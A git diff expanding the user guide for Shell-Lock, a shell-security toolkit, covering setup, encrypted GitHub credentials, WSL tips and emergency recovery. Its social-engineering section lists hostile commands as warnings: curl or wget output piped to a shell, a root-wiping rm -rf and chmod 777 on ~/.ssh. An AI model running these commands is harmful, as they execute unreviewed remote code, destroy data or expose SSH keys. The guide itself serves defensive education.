@@ -1,30 +1,146 @@
-# 🔧 Shell-Lock Usage Guide & FAQ
+# 🔧 Shell-Lock Complete Usage Guide
 
-This guide covers common usage scenarios and frequently asked questions for Shell-Lock users.
+This comprehensive guide covers all usage scenarios, security best practices, and protection against social engineering attacks for Shell-Lock users.
 
 ## 📚 Table of Contents
 
 - [Quick Start Commands](#quick-start-commands)
+- [Tested Environment Requirements](#tested-environment-requirements)
+- [Security-First Operations](#security-first-operations)
 - [Managing Integrity Warnings](#managing-integrity-warnings)
-- [Configuration Management](#configuration-management)
+- [Secure Credential Management](#secure-credential-management)
+- [GitHub Authentication (Secure Method)](#github-authentication-secure-method)
 - [Backup and Recovery](#backup-and-recovery)
-- [GitHub Authentication](#github-authentication)
+- [Social Engineering Protection](#social-engineering-protection)
+- [WSL-Specific Guidance](#wsl-specific-guidance)
+- [Emergency Procedures](#emergency-procedures)
 - [Troubleshooting](#troubleshooting)
-- [FAQ](#faq)
+- [Frequently Asked Questions](#frequently-asked-questions)
 
 ## 🚀 Quick Start Commands
 
-```bash
-# Essential commands you'll use daily
-shell-lock help                    # Show all commands
-shell-lock audit                   # Run security check
-shell-lock backup-all              # Create secure backups
-shell-lock emergency               # Emergency clean shell
+### Essential Daily Commands
 
-# GitHub authentication (secure)
-secure-cred set github <username> <token>    # Store token
-gh-secure auth login <username>              # Login with stored token
-gh-secure repo list                          # Use GitHub CLI securely
+```bash
+# Security audit (run daily)
+shell-lock audit
+
+# Create secure backups before system changes
+shell-lock backup-all
+
+# Emergency clean shell (if compromised)
+shell-lock emergency
+
+# Show all available commands
+shell-lock help
+```
+
+### Credential Management (Secure)
+
+```bash
+# Store GitHub token securely (encrypted with GPG)
+secure-cred set github <username> <token>
+
+# Login using encrypted credentials
+gh-secure auth login <username>
+
+# Use GitHub CLI securely (all commands work)
+gh-secure repo list
+gh-secure issue create
+gh-secure pr create
+```
+
+## 🔧 Tested Environment Requirements
+
+## 🔧 Tested Environment Requirements
+
+### ✅ Confirmed Testing
+
+**Shell-Lock has been tested on:**
+
+- **WSL2** (Windows Subsystem for Linux 2)
+- **Ubuntu** (tested versions available to project)
+
+### 🔄 Community Testing Welcome
+
+**We welcome community testing and feedback for:**
+
+- **macOS** - Community feedback appreciated
+- **Other Linux distributions** - Community verification helpful
+- **BSD systems** - Community testing needed
+
+### ❌ Known Incompatible Platforms
+
+- **Windows PowerShell/CMD** - Use WSL2 instead
+- **Alpine Linux** - Different shell behavior, compatibility unknown
+
+### Shell Compatibility
+
+```bash
+# Supported shells
+Zsh (Z shell)      - ✅ Primary target with features
+Bash (Bourne Again SHell) - ✅ Compatibility support
+POSIX shells       - ✅ Profile-based protection
+
+# Verify your shell
+echo $SHELL
+```
+
+## 🛡️ Security-First Operations
+
+### Before You Start - Security Checklist
+
+**⚠️ CRITICAL: Complete these security checks before using Shell-Lock:**
+
+1. **Verify Prerequisites Installation**
+
+   ```bash
+   # Check all required tools are installed
+   for tool in gpg ssh git sha256sum; do
+       if command -v "$tool" >/dev/null 2>&1; then
+           echo "✅ $tool installed"
+       else
+           echo "❌ $tool MISSING - install from official repos only"
+       fi
+   done
+   ```
+
+2. **Verify Repository Authenticity**
+
+   ```bash
+   # Check you're in the correct directory
+   pwd  # Should be ~/dev/shell-lock or similar
+
+   # Verify git remote (should be official repository)
+   git remote -v
+
+   # Check for suspicious files
+   find . -type f -name "*.sh" -exec head -5 {} \;
+   ```
+
+3. **Test in Isolated Environment First**
+   ```bash
+   # Create test user or use container for initial testing
+   # Never test on production systems first
+   ```
+
+### Initial Secure Setup
+
+```bash
+# Step 1: Run installation (review what it does)
+./install.sh 2>&1 | tee install.log
+
+# Step 2: Verify installation
+shell-lock help
+
+# Step 3: Run guided setup
+shell-lock setup
+
+# Step 4: Create initial backups
+shell-lock backup-all
+
+# Step 5: Run security baseline
+shell-lock audit
 ```
 
 ## ⚠️ Managing Integrity Warnings
@@ -561,9 +677,127 @@ rm ~/.local/share/file-integrity.txt && security-check
 zsh -c "echo 'Test startup'"
 ```
 
+## 🛡️ Social Engineering Protection
+
+### Understanding Social Engineering Threats
+
+**Social engineering attacks target the human element rather than technical vulnerabilities.** In development environments, these attacks often involve:
+
+- **Malicious "helper" scripts** disguised as productivity tools
+- **Fake security updates** that actually compromise systems
+- **Credential harvesting** through seemingly legitimate tools
+- **Supply chain attacks** via compromised dependencies
+- **"Quick fixes"** for common problems that contain backdoors
+
+### 🚨 Red Flags - Never Trust These
+
+**Immediate red flags that indicate potential social engineering:**
+
+```bash
+# NEVER run commands like these from untrusted sources:
+curl http://example.com/script.sh | bash     # Pipe to shell
+wget -qO- http://example.com/setup | sh      # Download and execute
+bash <(curl -s http://example.com/install)   # Download and execute
+sudo rm -rf / --no-preserve-root             # Destructive commands
+chmod 777 ~/.ssh/                            # Dangerous permissions
+```
+
+**Common social engineering phrases to watch for:**
+
+- "Quick fix for your problem"
+- "Just run this one command"
+- "This will solve all your issues"
+- "Don't worry about what it does"
+- "Everyone uses this script"
+
+### ✅ Shell-Lock Protection Features
+
+**How Shell-Lock protects against social engineering:**
+
+1. **Input Validation** - All inputs sanitized and validated
+2. **Secure Defaults** - Most secure settings used by default
+3. **Transparency** - All scripts are readable and auditable
+4. **User Education** - Clear warnings about security implications
+
+### Safe Verification Practices
+
+```bash
+# Always verify script contents before running
+head -20 install.sh
+cat scripts/secure-cred | less
+
+# Check repository authenticity
+git remote -v  # Should be official Shell-Lock repository
+
+# Test in isolation first
+# Use containers or test accounts for initial testing
+```
+
+## 🔧 WSL-Specific Guidance
+
+### WSL2 Security Features
+
+**Shell-Lock automatically detects and optimizes for WSL environments:**
+
+```bash
+# Check if running in WSL
+echo $WSL_DISTRO_NAME  # Shows WSL distribution name if in WSL
+
+# WSL-specific security checks are enabled automatically
+shell-lock audit  # Includes WSL-aware monitoring
+```
+
+### WSL Security Best Practices
+
+1. **Separate Windows and Linux credentials**
+2. **Monitor cross-platform file access**
+3. **Be cautious of shared network services**
+4. **Keep Windows and Linux tools separate**
+
+## 🚨 Emergency Procedures
+
+### If Your System is Compromised
+
+**Immediate Actions:**
+
+```bash
+# 1. Get to clean emergency shell
+shell-lock emergency
+
+# 2. Run security assessment
+shell-lock audit > /tmp/security-report.txt
+
+# 3. Check backup integrity
+shell-lock verify
+
+# 4. Restore if needed
+shell-lock restore-all
+```
+
+### Recovery Steps
+
+1. **Revoke all credentials** using a different secure device
+2. **Restore from verified backups** using `shell-lock restore-all`
+3. **Update security baseline** with `rm ~/.local/share/file-integrity.txt && shell-lock audit`
+4. **Enhance monitoring** for suspicious activity
+
 ---
 
 **💡 Remember:** Shell-Lock is designed to protect you, not get in your way. When you see warnings, it means the system is working correctly and detected changes that need your attention.
+
+## Important Disclaimers
+
+**Testing and Compatibility:**
+
+- **Limited Testing**: This software has been tested only on WSL2 and Ubuntu environments
+- **No Guarantees**: We make no claims about safety, security, or functionality on other systems
+- **User Responsibility**: You must understand each feature and test in your environment
+
+**Security Limitations:**
+
+- **No Security Guarantees**: This toolkit provides features but cannot guarantee protection against all threats
+- **Proper Configuration Required**: Security depends on proper understanding and configuration
+- **Regular Maintenance**: Security requires ongoing monitoring and updates
 
 For more detailed information, see:
 
